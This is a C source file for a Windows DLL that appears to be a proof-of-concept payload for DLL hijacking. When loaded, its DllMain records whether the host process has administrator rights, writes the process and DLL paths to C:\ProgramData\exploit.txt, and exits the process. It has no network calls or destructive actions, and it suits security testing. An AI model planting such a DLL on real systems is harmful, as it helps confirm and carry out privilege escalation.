#include <windows.h>
#include <stdio.h>


BOOL IsRunAsAdmin() {
	BOOL  fIsRunAsAdmin = FALSE;
	PSID  pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
			FreeSid(pAdministratorsGroup);
			return fIsRunAsAdmin;
		}
		FreeSid(pAdministratorsGroup);
	}
	return fIsRunAsAdmin;
}
BOOL ExploitValidation(BOOL fIsRunAsAdmin, HMODULE hModule) {
	const char* textFile = "C:\\ProgramData\\exploit.txt";
    char processFullPath[MAX_PATH];
	char dllFullPath[MAX_PATH];

    GetModuleFileNameA(NULL, processFullPath, MAX_PATH);
    GetModuleFileNameA(hModule, dllFullPath, MAX_PATH);

	FILE* pFile;
	if (fopen_s(&pFile, textFile, "w") == 0) {
		fprintf(pFile, "%i %s %s", fIsRunAsAdmin, processFullPath, dllFullPath);
		fclose(pFile);
		return TRUE;
	}
	return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		ExploitValidation(IsRunAsAdmin(), hModule);
		ExitProcess(0);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
